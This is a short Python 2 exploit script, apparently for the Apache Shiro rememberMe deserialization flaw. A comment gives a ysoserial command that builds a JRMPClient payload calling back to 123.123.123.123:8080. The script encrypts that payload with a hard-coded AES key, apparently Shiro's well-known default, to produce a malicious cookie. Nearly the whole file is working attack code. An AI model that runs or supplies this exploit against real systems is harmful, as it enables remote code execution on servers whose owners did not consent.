# -*- coding: utf-8 -*- 
from Crypto.Cipher import AES 
from Crypto import Random 
from base64 import b64encode
from base64 import b64decode 

#漏洞利用：
#java -jar ysoserial-0.0.5-SNAPSHOT-all.jar JRMPClient 123.123.123.123:8080 >payload.dat


BS = AES.block_size
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
unpad = lambda s: s[0:-ord(s[-1])]

def encrypt(key, text): 
    IV = Random.new().read(AES.block_size) 
    cipher = AES.new(key, AES.MODE_CBC, IV=IV) 
    data = b64encode(IV + cipher.encrypt(pad(text))) 
    return data

def decrypt(key, enc): 
    data = b64decode(enc) 
    IV = data[0:16] 
    cipher = AES.new(key, AES.MODE_CBC, IV=IV) 
    return unpad(cipher.decrypt(data[16:])) 

key = b64decode('kPH+bIxk5D2deZiIxcaaaA==')
print encrypt(key, open('payload.dat','rb').read())